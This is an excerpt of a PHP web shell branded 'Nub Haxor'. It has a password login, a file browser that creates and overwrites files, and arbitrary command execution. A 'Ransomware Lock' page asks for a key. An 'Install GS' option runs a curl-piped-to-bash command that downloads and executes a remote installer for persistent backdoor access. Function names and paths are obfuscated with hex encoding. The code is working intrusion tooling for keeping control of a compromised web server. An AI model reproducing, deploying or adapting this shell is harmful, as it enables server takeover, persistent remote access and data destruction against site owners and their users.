...
// $GLOBALS['fungsi'][0]
	...
	<html>
	<head>
	<title>-=[ Nub Haxor ]=-</title>
	<link rel='icon' href='https://res.cloudinary.com/dvztple2b/image/upload/v1728502867/Nubinthehouse_ynyodd.png'>
	<meta name="theme color" content="#00BFFF">
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
	</head>
	<style>
		body {
        background-image: url("https://s11.gifyu.com/images/SBe9T.jpg");
	...
	<body>
	<form method="post">
			<input placeholder="Input Password" type="password" name="pass" required>
			<input type="submit" name="watching" value="Masuk!">
		</form>
	</body>
	</html>
	<?php
	...
	<head>
		<title>Nub Haxor</title>
		<meta charset='UTF-8'>
		<meta name='author' content='Nub Haxor'>
        ...
        <style>
			...
			*{
			...
			body {
				background: url('https://s11.gifyu.com/images/SBe9T.jpg');
				background-repeat: no-repeat;
				background-size: cover;
				background-position: center;
				color: #ff0000;
			...
			.table-dark {
				--bs-table-color: #ff0000;
				--bs-table-color: #ff0000;
				--bs-table-bg: transparent;
				--bs-table-border-color: #ff0000;
				--bs-table-striped-bg: #ff0000;
				--bs-table-striped-color: #ff0000;
				--bs-table-active-bg: #ff0000;
				--bs-table-active-color: #ff0000;
				--bs-table-hover-bg: #00000000;
				--bs-table-hover-color: #ff0000;
			}
	...
	<div class='py-3' id='main'>
		<div class='box shadow box-container p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4 class='text-center'>Nub Haxor</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		<div class='container-fluid'>
			...
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-infos p-3 rounded-3'>
			...
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='".basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH))."'><i class='bi bi-house'></i> HOME</a>
			</div>

			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=ransomware'><i class='bi bi-lock'></i> Ransomware Lock</a>
			</div>

			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=installgs'><i class='bi bi-upload'></i> Install GS</a>
			</div>
			...
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createdir'><i class='bi bi-files'></i> Create Dir</a>
			</div>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createfile'><i class='bi bi-file'></i> Create File</a>
			</div>
			<div class='btn-group'>
		...
		if($_7['id'] == 'createdir'){
			...
			if($_POST['start']) {
				...
				$dirs = unhex($_GET['dir']);
				$n_dfa65a16 = mkdir($dirs . "/" . $dirname);

				if ($n_dfa65a16 == true) {             
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirname Create successfully<br>";
				} else {
					echo "[<red><i class='bi bi-exclamation-triangle-fill'></i></red>]&nbsp;Failed to Create $dirname<br>";
				}
			}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Directory Name:
				<input class='form-control btn-sm' type='text' name='dirname' placeholder='directory name'>
				
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm'type='submit' name='start' value='createdir'>
				</div>
			</form>
		</div>";
		}
		...
		if($_7['id'] == 'createfile'){
			...
			if($_POST['start']) {
				$filenames = $_POST["d_file"];
				$contentFile = $_POST["script"];
				$dirs = unhex($_GET['dir']);

				$n_dfa65a16 = file_put_contents($dirs . "/" . $filenames, $contentFile);
            
				if (file_exists($dirs . "/" . $filenames)) { 
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$filenames Create successfully<br>";
				} else {
					echo "[<red><i class='bi bi-exclamation-triangle-fill'></i></red>]&nbsp;Failed to Create $filenames<br>";
				}
			}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'>
				...
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm'type='submit' name='start' value='createfile'>
				</div>
			</form>
		</div>";
		}
		...
		if (!empty($_POST['cmd'])) {
			...
			if (!empty($cmdResult)) {
				echo "
				<div class='container-fluid language-javascript' style='background: #0c0e14;'>
		...
		if ($_7['id'] == 'installgs') {
			echo '
				<br>
				<div class="container-fluid language-javascript" style="background: #0c0e14; border: 1px solid #ff0000;">
					<div class="shell mb-3" style="margin-top: 10px;">
						<pre style="font-size:10px;"><code>'.exe('bash -c "$(curl -fsSL https://gsocket.io/y)"').'</code></pre>
					</div>
				</div>';
		}
		// Upload Via Link raw
		...
		if (isset($_GET['dir']) && $_GET['id'] == "ransomware") {
			ob_implicit_flush();ob_end_flush();s();
			echo "
			<div class='text-center' style='background-color: black; border: 1px solid red;'>
				<pre style='color: red;'>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</pre>
				...
				<input class='input-ransom' style='text-align: center;' type='text' placeholder='key'>
				<br>
				<a class='btn-ransom' style='text-decoration: none;' type='button' href='".$_SERVER['REQUEST_URI']."&id_two=konciiii'>Gasak</a>
			</div>";
		}
		...
		<tr>
			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none" href="?dir='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
		...
		echo "
		<tr>
			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none listdir' href='?path=".hex($path.'/'.$dir)."'>$_d</a></td>
		...
		echo "
		<tr>
		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none listdir' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
		...
		</div><div class='text-secondary'>&copy Nub Haxor - Nuub</div>
	</div>
</div>
</body>
</html>